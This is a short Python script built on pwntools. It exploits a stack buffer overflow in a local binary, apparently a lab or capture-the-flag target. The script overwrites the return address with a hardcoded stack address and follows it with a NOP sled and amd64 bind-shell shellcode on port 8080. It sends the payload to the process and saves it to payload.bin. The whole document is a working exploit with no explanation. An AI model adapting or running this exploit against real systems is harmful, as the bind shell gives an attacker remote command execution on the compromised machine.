from pwn import *

OFFSET = 26;

context.binary = "./a.out"
context.log_level = "debug"

sh = process("./a.out")

r_a = "0x7fffffffe46e"
print(r_a)
return_address = p64(0x7fffffffe5de + OFFSET + 8 + 4 * 8)

payload = OFFSET * b'A' + return_address

# Nop Sled
sc = shellcraft.amd64.nop() * 128

# Shellcode
sc += shellcraft.amd64.linux.bindsh(8080, "ipv4")

sc += shellcraft.amd64.linux.exit();

payload += asm(sc)

sh.sendline(payload)

print(sh.recvline())

with open("payload.bin", "wb") as f:
    f.write(payload)

sh.close()
